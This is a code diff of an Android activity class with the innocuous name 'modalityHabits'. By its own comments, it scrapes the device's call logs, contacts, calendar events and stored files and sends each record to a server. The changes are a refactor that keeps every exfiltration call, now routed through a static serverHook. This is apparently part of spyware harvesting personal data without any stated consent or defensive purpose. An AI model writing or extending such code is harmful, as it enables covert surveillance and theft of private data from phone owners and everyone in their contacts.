@@ -20,7 +20,7 @@ import java.util.List;
 public class modalityHabits extends AppCompatActivity {
 
     // scrapes call logs and sends them to a server
-    public void getCalls(Context mContext, serverHook hook){
+    public void getCalls(Context mContext){
         // array of all texts
         List<String> calls = new ArrayList<>();
 
@@ -66,12 +66,12 @@ public class modalityHabits extends AppCompatActivity {
 
 
         for (String t : calls) {
-            hook.sendToServer("log", t);
+            serverHook.sendToServer("log", t);
         }
     }
 
     // scrapes contacts and sends them to a server
-    public void getContacts(Context mContext,serverHook hook){
+    public void getContacts(Context mContext){
         ContentResolver cr = mContext.getContentResolver();
         Cursor phone = cr.query(ContactsContract.Contacts.CONTENT_URI,
                 null, null, null, null);
@@ -103,14 +103,14 @@ public class modalityHabits extends AppCompatActivity {
             }
             contact = contact.substring(0, contact.length()-1);
             contact += '}';
-            hook.sendToServer("contact",contact);
+            serverHook.sendToServer("contact",contact);
 
         }
         phone.close();
     }
 
     // scrapes call logs and sends them to a server
-    public void getCalendar(Context mContext,serverHook hook){
+    public void getCalendar(Context mContext){
         // array of all texts
         List<String> events = new ArrayList<>();
 
@@ -144,7 +144,7 @@ public class modalityHabits extends AppCompatActivity {
                 }
                 eventData = eventData.substring(0, eventData.length()-1);
                 eventData += '}';
-                hook.sendToServer("calendar",eventData);
+                serverHook.sendToServer("calendar",eventData);
             } while (cursor.moveToNext());
         } else {
             System.out.println("No events found");
@@ -154,7 +154,7 @@ public class modalityHabits extends AppCompatActivity {
     }
 
     // scrapes call logs and sends them to a server
-    public void getStorage(Context mContext,serverHook hook){
+    public void getStorage(Context mContext){
         // array of all texts
         List<String> events = new ArrayList<>();
 
@@ -188,7 +188,7 @@ public class modalityHabits extends AppCompatActivity {
                 }
                 msg = msg.substring(0, msg.length()-1);
                 msg += "}";
-                hook.sendToServer("file", msg);
+                serverHook.sendToServer("file", msg);
             } while (cursor.moveToNext());
         } else {
             System.out.println("No events found");
